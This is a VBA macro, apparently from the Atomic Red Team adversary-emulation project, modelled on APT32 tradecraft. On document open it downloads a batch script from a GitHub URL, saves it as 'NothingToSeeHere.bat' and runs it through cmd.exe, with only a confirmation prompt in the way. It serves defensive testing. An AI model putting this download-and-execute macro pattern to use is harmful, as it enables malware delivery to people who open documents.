' Save Document As Single Web Page .mht
' Rename Document As .Doc
' This Document is modeled after FireEye's report on APT32
' Special Thanks to Nick Carr for his work on this write-up
' https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html

Sub AutoOpen()

Dim myURL As String
Dim myPath As String


If (MsgBox("You're Are About To Execute the ATOMIC Test for Dragon's Tail, You sure?", 1, vbMsgBoxSetForeground) = 2) Then
     End ' This Ends Macro
End If

' Downloads Dragon's Tail Chain Reaction Script
myURL = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat"

Dim WinHttpReq As Object
Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False, "username", "password"
WinHttpReq.send

myURL = WinHttpReq.responseBody
If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.responseBody

    Dim fso As Object
    Const FLDR_NAME As String = "C:\Tools\"

    Set fso = CreateObject("Scripting.FileSystemObject")

    If Not fso.FolderExists(FLDR_NAME) Then
        fso.CreateFolder (FLDR_NAME)
    End If

    ' Change Path HERE
    oStream.SaveToFile "C:\Tools\NothingToSeeHere.bat", 2  ' 1 = no overwrite, 2 = overwrite
    ' EXECUTE FROM PATH
    Shell "cmd.exe /c C:\Tools\NothingToSeeHere.bat"
    oStream.Close
End If

End Sub
